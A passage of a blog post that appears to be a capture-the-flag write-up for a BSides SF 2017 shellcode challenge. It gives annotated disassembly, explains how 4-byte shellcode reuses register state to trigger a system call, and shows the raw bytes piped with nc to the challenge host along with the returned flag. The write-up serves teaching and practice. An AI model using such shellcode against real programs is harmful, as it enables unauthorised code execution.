_posts/2017-02-14-bsides-ctf-writeup.html

<div id="outline-container-orge67c87f" class="outline-4">
<h4 id="orge67c87f">Direct System Call</h4>
<div class="outline-text-4" id="text-orge67c87f">
<p>
Beginning at <code>0x80487ef</code>, the core code runs:
</p>

<div class="org-src-container">
<pre class="src src-nasm"><span style="color: #657b83; font-weight: bold;">call</span>   <span style="color: #6c71c4;">80486db</span> &lt;get_flag&gt; <span style="color: #93a1a1;">;; where the 'flag' is gotten</span>
<span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x10</span>
<span style="color: #657b83; font-weight: bold;">lea</span>    <span style="color: #268bd2;">eax</span>,<span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x8c</span><span style="color: #2aa198;">]</span>
<span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">esi</span>,<span style="color: #268bd2;">eax</span>
<span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #6c71c4;">0x1</span>
<span style="color: #657b83; font-weight: bold;">sub</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x8</span>
<span style="color: #657b83; font-weight: bold;">lea</span>    <span style="color: #268bd2;">eax</span>,<span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x8c</span><span style="color: #2aa198;">]</span>
<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #268bd2;">eax</span>
<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #6c71c4;">0x8048946</span>
<span style="color: #657b83; font-weight: bold;">call</span>   <span style="color: #6c71c4;">8048500</span> <a href="mailto:printf%40plt">&lt;printf@plt&gt;</a>
<span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x10</span>
<span style="color: #657b83; font-weight: bold;">sub</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0xc</span>
<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #6c71c4;">0x8048964</span>
<span style="color: #657b83; font-weight: bold;">call</span>   <span style="color: #6c71c4;">8048550</span> <a href="mailto:puts%40plt">&lt;puts@plt&gt;</a>
<span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x10</span>
<span style="color: #657b83; font-weight: bold;">sub</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x4</span>
<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #6c71c4;">0x5</span>
<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #b58900;">DWORD</span> PTR <span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x94</span><span style="color: #2aa198;">]</span>
<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #6c71c4;">0x0</span>
<span style="color: #657b83; font-weight: bold;">call</span>   <span style="color: #6c71c4;">80484f0</span> <a href="mailto:read%40plt">&lt;read@plt&gt;</a> <span style="color: #93a1a1;">;; where `read` is called</span>
<span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x10</span>
<span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #b58900;">DWORD</span> PTR <span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x90</span><span style="color: #2aa198;">]</span>,<span style="color: #268bd2;">eax</span>
<span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">edx</span>,<span style="color: #6c71c4;">0xff</span>
<span style="color: #657b83; font-weight: bold;">cmp</span>    <span style="color: #b58900;">DWORD</span> PTR <span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x90</span><span style="color: #2aa198;">]</span>,<span style="color: #6c71c4;">0x5</span>
<span style="color: #657b83; font-weight: bold;">ja</span>     <span style="color: #6c71c4;">804885c</span> &lt;main+<span style="color: #268bd2; font-weight: bold;">0x10c</span>&gt;
<span style="color: #657b83; font-weight: bold;">jmp</span>    <span style="color: #b58900;">DWORD</span> PTR <span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x94</span><span style="color: #2aa198;">]</span> <span style="color: #93a1a1;">;; here is where it finally jumps in</span>
</pre>
</div>

<p>
The last line is where this <code>jmp</code> to attacker-controlled memory actually
occurs.
</p>

<p>
Although the above code snippet doesn&rsquo;t show it directly, it&rsquo;s also important
to note that the address of the flag read remains stored in <code>ESI</code> when the <code>jmp
    [ebp-0x94]</code> occurs.
</p>

<p>
In tandem with the fact that <code>read</code> returns the length of the value read in
<code>EAX</code>, you can abuse this by entering a system-call. (Remember, Linux calling
convention dictates that x86 system call&rsquo;s interrupt vector is given in <code>EAX</code>)
</p>

<p>
So, in total you need to write shellcode that is only <b>4</b> bytes long (rather
than the maximum permitted of 6), you can have the interrupt vector &rsquo;prefilled&rsquo;
for you. This leaves you with only two tasks:
</p>

<ul class="org-ul">
<li>All you need to do now is find an efficient way to copy <code>ESI</code> into <code>ECX</code> (the source register for the <code>read</code> system call)</li>
<li>Actually invoking a system call.</li>
</ul>

<p>
There are a number of ways to do the above and due to the idiosyncracies of how
assemblers are written and how opcodes are decoded, it&rsquo;s possible to write many
different variations of an instruction that vary wildly in length. Anything
that moves the contents of ESI into ECX will do.
</p>

<p>
After this, you need to initiate a system call, you can use either <code>sysenter</code>
or <code>int 0x80</code> as both are encoded in 2 bytes.
</p>

<p>
All told, the following shellcode should do just fine.
</p>

<div class="org-src-container">
<pre class="src src-nasm"><span style="color: #657b83; font-weight: bold;">mov</span> <span style="color: #268bd2;">cx</span>, <span style="color: #268bd2;">si</span>
<span style="color: #657b83; font-weight: bold;">int</span> <span style="color: #6c71c4;">0x80</span>
</pre>
</div>

<p>
I use and recommend <a href="http://www.nasm.us/">Netwide Assembler</a>, although there are other tools like
<a href="https://github.com/radare/radare2/wiki/Ragg2">Ragg2</a>. To generate assembly without any sort of executable format, you can use
the following argument switches to assemble and hexdump your shellcode:
</p>

<p>
<code>nasm -f bin assembly.asm &amp;&amp; xxd assembly</code>
</p>

<p>
After this, you can encode it in whichever format you&rsquo;d like and send it off!
</p>

<pre class="example" id="org511fd28">
[zv@syszv] /tmp &gt;&gt; echo -en '\x89\xf1\xcd\x80' | \
                   nc i-am-the-shortest-6d15ba72.ctf.bsidessf.net 8890
The address of 'flag' is 0xfff3bd5c
Send your machine code now! Max length = 5 bytes.

FLAG:c9f053110aa0f2d28ed8978e3b03cb01
v7`v`v7`vyy`v`vp7x%
</pre>
</div>
</div>

<div id="outline-container-orgf4c5046" class="outline-4">
<h4 id="orgf4c5046">Return-to-Libc</h4>
<div class="outline-text-4" id="text-orgf4c5046">
<p>
This is a little trickier, you need to abuse at least two different tricks here.
</p>
</div>
</div>
</div>
</section>
